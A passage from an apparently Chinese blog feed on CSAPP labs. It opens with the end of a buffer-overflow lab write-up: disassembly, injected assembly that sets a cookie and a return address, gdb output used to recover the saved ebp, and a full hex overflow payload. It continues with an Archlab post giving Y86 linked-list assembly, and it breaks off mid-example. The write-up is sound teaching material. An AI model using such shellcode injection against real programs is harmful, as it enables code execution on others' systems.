class="hljs apache"><span class="hljs-attribute">08048daa</span> &lt;test&gt;:<br><span class="hljs-attribute">8048daa</span>:<span class="hljs-number">55</span>                   push   %ebp<br><span class="hljs-attribute">8048dab</span>:<span class="hljs-number">89</span> e5                mov    %esp,%ebp<br><span class="hljs-attribute">8048dad</span>:<span class="hljs-number">53</span>                   push   %ebx<br><span class="hljs-attribute">8048dae</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">24</span>             sub    $<span class="hljs-number">0</span>x24,%esp<br><span class="hljs-attribute">8048db1</span>:e8 da ff ff ff       call   <span class="hljs-number">8048</span>d90 &lt;uniqueval&gt;<br><span class="hljs-attribute">8048db6</span>:<span class="hljs-number">89</span> <span class="hljs-number">45</span> f4             mov    %eax,-<span class="hljs-number">0</span>xc(%ebp)<br><span class="hljs-attribute">8048db9</span>:e8 <span class="hljs-number">36</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">80491</span>f4 &lt;getbuf&gt;<br><span class="hljs-attribute">8048dbe</span>:<span class="hljs-number">89</span> c3                mov    %eax,%ebx#将返回地址设置为这里<br><span class="hljs-attribute">8048dc0</span>:e8 cb ff ff ff       call   <span class="hljs-number">8048</span>d90 &lt;uniqueval&gt;<br></code></pre></td></tr></table></figure><p> 所以汇编代码bang.s这样编写：<br> <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">movl $0x6c6fcfb8,%eax     <span class="hljs-comment">#修改 eax 为 coockie</span><br>pushl $0x08048dbe  <span class="hljs-comment">#将返回地址入栈</span><br>ret<br></code></pre></td></tr></table></figure><br> 编译后得到代码：<br> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <br><span class="hljs-attribute">bang</span>.o：     文件格式 elf32-i386<br><br><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:b8 b8 cf <span class="hljs-number">6</span>f <span class="hljs-number">6</span>c       mov    $<span class="hljs-number">0</span>x6c6fcfb8,%eax<br>   <span class="hljs-attribute">5</span>:<span class="hljs-number">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span>       push   $<span class="hljs-number">0</span>x8048dbe<br>   <span class="hljs-attribute">a</span>:c3                   ret<br><br></code></pre></td></tr></table></figure><br> <strong>另外，为了防止对栈的破坏，%ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。需要注入的时候在40 – 44 字节注入保存好的 ebp 值，可以防止 ebp 的值被破坏。</strong><br> ebp的值用gdb查找，在getbuf处下断点，步过几步，查看ebp的值<br> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">pwndbg</span>&gt; info registers<br><span class="hljs-attribute">eax</span>            <span class="hljs-number">0</span>x108112de          <span class="hljs-number">276894430</span><br><span class="hljs-attribute">ecx</span>            <span class="hljs-number">0</span>xf7e1e094          -<span class="hljs-number">136191852</span><br><span class="hljs-attribute">edx</span>            <span class="hljs-number">0</span>x108112de          <span class="hljs-number">276894430</span><br><span class="hljs-attribute">ebx</span>            <span class="hljs-number">0</span>x1                 <span class="hljs-number">1</span><br><span class="hljs-attribute">esp</span>            <span class="hljs-number">0</span>x55683878          <span class="hljs-number">0</span>x55683878 &lt;_reserved+<span class="hljs-number">1038456</span>&gt;<br><span class="hljs-attribute">ebp</span>            <span class="hljs-number">0</span>x556838a0          <span class="hljs-number">0</span>x556838a0 &lt;_reserved+<span class="hljs-number">1038496</span>&gt;<br><span class="hljs-attribute">esi</span>            <span class="hljs-number">0</span>x556865c0          <span class="hljs-number">1432905152</span><br><span class="hljs-attribute">edi</span>            <span class="hljs-number">0</span>x1                 <span class="hljs-number">1</span><br><span class="hljs-attribute">eip</span>            <span class="hljs-number">0</span>x8048de0           <span class="hljs-number">0</span>x8048de0 &lt;test+<span class="hljs-number">54</span>&gt;<br><span class="hljs-attribute">eflags</span>         <span class="hljs-number">0</span>x293              <span class="hljs-meta"> [ CF AF SF IF ]</span><br><span class="hljs-attribute">cs</span>             <span class="hljs-number">0</span>x23                <span class="hljs-number">35</span><br><span class="hljs-attribute">ss</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">ds</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">es</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">fs</span>             <span class="hljs-number">0</span>x0                 <span class="hljs-number">0</span><br><span class="hljs-attribute">gs</span>             <span class="hljs-number">0</span>x63                <span class="hljs-number">99</span><br><br></code></pre></td></tr></table></figure><br> ebp的值为0x556838a0，40 – 44 字节注入保存好的 ebp 值。<br> 所以payload构造过程为：</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> b8 cf <span class="hljs-number">6</span>f <span class="hljs-number">6</span>c <span class="hljs-number">68</span> be <span class="hljs-number">8</span>d <br><span class="hljs-attribute">04</span> <span class="hljs-number">08</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a0</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> <span class="hljs-number">48</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span>a<br><span class="hljs-comment">#前44字节为汇编代码（11字节）+溢出数据（29）+ebp的值（4）+buf起始地址（4）</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——Archlab(32bit)</title>
    <link href="/2023/10/04/CSAPP%E2%80%94%E2%80%94Archlab-32bit/"/>
    <url>/2023/10/04/CSAPP%E2%80%94%E2%80%94Archlab-32bit/</url>
    
    <content type="html"><![CDATA[<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>Arch Lab 分为三部分。A 部分需要我们写一些简单的Y86-64程序，从而熟悉Y86-64工具的使用；在 B 部分中，我们要用一个新的指令来扩展SEQ；C 部分是本实验的核心，我们要通过理解流水线的过程以及利用新的指令来优化程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sim<br>  - misc    <span class="hljs-comment"># 包含了 指令集(isa)/汇编器(yas)/模拟器(yis)</span><br>  - <span class="hljs-built_in">seq</span>     <span class="hljs-comment"># 顺序执行模式 hcl 的实现</span><br>  - pipe    <span class="hljs-comment"># 流水线执行模式 hcl 的实现</span><br>  - ptest   <span class="hljs-comment"># 测试脚本</span><br>  - y86-code <span class="hljs-comment"># Y86-64 指令集的示例代码</span><br><br></code></pre></td></tr></table></figure><p>在这部分，要用Y86-64汇编代码实现examples.c中的三个函数。这三个函数都是与链表有关的操作，链表结点定义如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* linked list element */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ELE</span> &#123;<br>    <span class="hljs-type">long</span> val;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ELE</span> *next;<br>&#125; *list_ptr;<br></code></pre></td></tr></table></figure><p>在编写汇编代码之前，我们先回顾一下Y86-64的指令集：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># movq i--&gt;r: 从立即数到寄存器...m（存储器）、r（寄存器）</span><br>irmovq, rrmovq, mrmovq, rmmovq<br><br><span class="hljs-comment"># Opq</span><br>addq, subq, andq, xorq<br><br><span class="hljs-comment"># 跳转 jXX</span><br>jmp, jle, jl, je, jne, jge, jg<br><br><span class="hljs-comment"># 条件传送 cmovXX</span><br>cmovle, cmovl, cmove, cmovne, cmovge, cmovg<br><br>call, ret<br>pushq, popq<br><br><span class="hljs-comment"># 停止指令的执行</span><br>halt<br><br><span class="hljs-comment"># 寄存器</span><br>%rax, %rcx, %rdx<br>%rbx, %rsp, %rbp<br>%rsi, %rdi, %r8<br>%r9, %r10, %r11<br>%r12, %r13, %r14<br></code></pre></td></tr></table></figure><h3 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/* sum_list - Sum the elements of a linked list */</span><br>long sum_list(list_ptr ls)<br>&#123;<br>    long <span class="hljs-keyword">val</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (ls) &#123;<br>        <span class="hljs-keyword">val</span> += ls-&gt;<span class="hljs-keyword">val</span>;<br>        ls = ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">val</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题是一个链表求和</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># sum_list - Sum the elements of a linked list</span><br><span class="hljs-comment"># author: Deconx</span><br><br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>        .align <span class="hljs-number">8</span><br>ele1:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad ele2<br>ele2:<br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad ele3<br>ele3:<br>        .quad <span class="hljs-number">0xc00</span><br>        .quad <span class="hljs-number">0</span><br><br>main:<br>        irmovq ele1,%rdi<br>        call sum_list   <span class="hljs-comment"># sum_list(ele1)</span><br>        ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %rdi</span><br>sum_list:<br>        irmovq $0, %rax<br>        jmp test<br><br>loop:<br>        mrmov<span class="hljs-string">q (%rdi)</span>, %rsi<br>        addq %rsi, %rax<br>        mrmovq <span class="hljs-number">8</span>(%rdi), %rdi<br><br>test:<br>        andq %rdi, %rdi         <span class="hljs-comment">#用andq来设置CC</span><br>        jne loop<br>        ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br></code></pre></td></tr></table></figure><p><strong>程序分析</strong></p><ul><li>main：<br>main作为程序入口一定是要有的</li></ul><p>主要任务是准备函数参数，然后调用sum_list函数</p><p>其中rdi寄存器即负责传递参数，又充当链表指针</p><p>这是因为在传递参数时，初始值就相当于链表的第一个位置的指针，所以后续就直接使用该寄存器作为链表指针</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">irmovq ele<span class="hljs-number">1</span>,<span class="hljs-meta">%</span>rdi<br>   <span class="hljs-keyword">call</span> sum_list<br></code></pre></td></tr></table></figure><ul><li>sum_list作为函数</li></ul><p>sum_list会初始化一些寄存器，然后跳转到判断</p><p>从写高级语言的角度思考，在进行循环求和之前，首先会定义一个计数器并初始化为0，这里选择使用rax寄存器，因为这个计数器同时还应当是返回值，而rax寄存器恰好是作为返回值的寄存器，所以直接采用rax作为计数器，然后开始while的第一次条件判断</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">xorq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rax</span><br>jmp test<br></code></pre></td></tr></table></figure><ul><li>循环loop</li></ul><p>循环内部要做两件事情</p><p>1.完成累加</p><p>rdi是链表指针，存储着一个内存地址，我们需要将这个值从内存中取出后累加到计数器rax上</p><p>需要注意的是，在Y86-64中，add指令只支持对寄存器数据进行操作，无法直接将内存数据累加到寄存器中，所以需要首先将内存中的数据取出放到寄存器中，这里参照数组求和的代码，选择%r10寄存器</p><p>2.使链表指针向后移动一位</p><p>这里必须要看懂链表的结构</p><p>看懂.quad，表示4个word，即8个字节非常关键，知道这个可以得知链表具有如下结构<br><img src="/images/arch-1.png"></p><p>起初R[rdi] &#x3D; ele1</p><p>现在期望R[rdi] &#x3D; ele2</p><p>而ele2 &#x3D; M[ele1 + 8] &#x3D; M[R[rdi] + 8]</p><p>即mrmovq 8(%rdi), %rdi</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r10<br>addq %r10, %rax<br>mrmovq <span class="hljs-number">8</span>(%rdi), %rdi<br></code></pre></td></tr></table></figure><ul><li>循环还需要一个判断test</li></ul><p>通过对于链表的定义可知，判断是否遍历完成只需要判断rdi存储的地址是否为0即可</p><p>这里需要对rdi进行判断，并且不能改变rdi的值，只能选择与操作，一个数自身与自身相与，只有其为0，结果才为0,不为0则继续进行loop，否则return</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># addq <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span> 因为这个找了好久错<br>andq <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span><br>jne loop<br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><hr><p>以上是64位的情况，我居然从昨晚开始一直用32位去跑，折腾了一晚上都不知道哪里出错了，还以为是环境配置的问题。。。被自己蠢哭了TT</p><p>在网上没有找到直给的32位的代码，实际上包括寄存器的选择、操作码和操作数的大小等都需要改动。</p><p>以下是修改后的32位sum.ys：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># sum_list - Sum the elements of a linked list</span><br><span class="hljs-comment"># author: Deconx (modified for 32-bit)</span><br><br><span class="hljs-comment"># Execution begins at address 0</span><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp     <span class="hljs-comment"># Set up stack pointer</span><br>call main              <span class="hljs-comment"># Execute main program</span><br>halt                   <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>.align <span class="hljs-number">4</span><br>ele1:<br>.long <span class="hljs-number">0x00a</span><br>.long ele2<br>ele2:<br>.long <span class="hljs-number">0x0b0</span><br>.long ele3<br>ele3:<br>.long <span class="hljs-number">0xc00</span><br>.long <span class="hljs-number">0</span><br><br>main:<br>irmovl ele1, %edi<br>call sum_list   <span class="hljs-comment"># sum_list(ele1)</span><br>ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %edi</span><br>sum_list:<br>irmovl $0, %eax<br>jmp test<br><br>loop:<br>mrmovl (%edi), %esi<br>addl %esi, %eax<br>mrmovl <span class="hljs-number">4</span>(%edi), %edi<br><br>test:<br>andl %edi, %edi         <span class="hljs-comment"># 用andl来设置CC</span><br>jne loop<br>ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>具体改动如下：</p><ul><li>64位寄存器 %rax、%rdi、%rsi、%rsp 等被替换为相应的32位寄存器 %eax、%edi、%esi、%esp 等。</li><li>操作数的大小由64位的 .quad 更改为32位的 .long。</li><li>将指令中的 irmovq 更改为 irmovl，表示立即加载32位立即数。</li><li>对于 mrmovq，addq，andq 等指令，将其更改为 mrmovl，addl，andl，以处理32位数据。</li><li>指令中的 jmp，call，ret 等保持不变。</li></ul><p>这问题可算解决了。。。。耽误了好长好长时间</p><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* rsum_list - Recursive version of sum_list */</span><br>long rsum<span class="hljs-constructor">_list(<span class="hljs-params">list_ptr</span> <span class="hljs-params">ls</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ls)<br>        return <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br>        long <span class="hljs-keyword">val</span> = ls-&gt;<span class="hljs-keyword">val</span>;<br>        long rest = rsum<span class="hljs-constructor">_list(<span class="hljs-params">ls</span>-&gt;<span class="hljs-params">next</span>)</span>;<br>        return <span class="hljs-keyword">val</span> + rest;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是链表求和的递归实现，按照C语言代码的过程模拟即可</p><p>一下还是给出64&#x2F;32位程序的对比：</p><p>32bit：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># rsum_list - Recursive version of sum_list</span><br><span class="hljs-comment"># author: Deconx</span><br><br><span class="hljs-comment"># Execution begins at address 0</span><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp      <span class="hljs-comment"># Set up stack pointer</span><br>call main               <span class="hljs-comment"># Execute main program</span><br>halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>.align <span class="hljs-number">4</span><br>ele1:<br>    .long <span class="hljs-number">0x00a</span><br>    .long ele2<br>ele2:<br>    .long <span class="hljs-number">0x0b0</span><br>    .long ele3<br>ele3:<br>    .long <span class="hljs-number">0xc00</span><br>    .long <span class="hljs-number">0</span><br><br>main:<br>    irmovl ele1,%edi<br>    call rsum_list<br>    ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %edi</span><br>rsum_list:<br>    andl %edi, %edi<br>    je <span class="hljs-keyword">return</span>               <span class="hljs-comment"># if(!ls)</span><br>    mrmovl (%edi), %ebx     <span class="hljs-comment"># val = ls-&gt;val</span><br>    mrmovl <span class="hljs-number">4</span>(%edi), %edi    <span class="hljs-comment"># ls = ls-&gt;next</span><br>    pushl %ebx<br>    call rsum_list          <span class="hljs-comment"># rsum_list(ls-&gt;next)</span><br>    popl %ebx<br>    addl %ebx, %eax         <span class="hljs-comment"># val + rest</span><br>    ret<br><br><span class="hljs-keyword">return</span>:<br>    irmovl $0, %eax<br>    ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>64bit:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Execution begins at address 0</span><br>    .pos <span class="hljs-number">0</span><br>    irmovq stack,%rsp<br>    call main<br>    halt<br><br><span class="hljs-comment"># Sample linked list</span><br>.align <span class="hljs-number">8</span><br>ele1:<br>    .quad <span class="hljs-number">0x00a</span><br>    .quad ele2<br>ele2:<br>    .quad <span class="hljs-number">0x0b0</span><br>    .quad ele3<br>ele3:<br>    .quad <span class="hljs-number">0xc00</span><br>    .quad <span class="hljs-number">0</span><br><br>main: <br>    irmovq ele1, %rdi<br>    call rsum_list<br>    ret<br><br>rsum_list: <br>    pushq %r8   <span class="hljs-comment"># 因为等下要用到这个，所以我们要记得恢复原样</span><br>    xorq %rax,%rax<br><br>loop:<br>    andq %rdi,%rdi   <br>    jne r       <span class="hljs-comment"># 如果不是0 就继续递归</span><br>    xorq %rax,%rax <span class="hljs-comment"># 否则就返回0</span><br>    jmp end<br>r:  <br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%rdi  <span class="hljs-comment"># 移动到下一位</span><br>    call rsum_list<br>    addq %r8,%rax<br>end:<br>    popq %r8<br>    ret <br><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><h3 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* copy_block - Copy src to dest and return xor checksum of src */</span><br>long copy<span class="hljs-constructor">_block(<span class="hljs-params">long</span> <span class="hljs-operator">*</span><span class="hljs-params">src</span>, <span class="hljs-params">long</span> <span class="hljs-operator">*</span><span class="hljs-params">dest</span>, <span class="hljs-params">long</span> <span class="hljs-params">len</span>)</span><br>&#123;<br>    long result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>        long <span class="hljs-keyword">val</span> = *src++;<br>        *dest++ = <span class="hljs-keyword">val</span>;<br>        result ^= <span class="hljs-keyword">val</span>;<br>        len--;<br>    &#125;<br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组赋值操作，返回值为原数组各项的按位异或</p><p>64bit:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># This is a 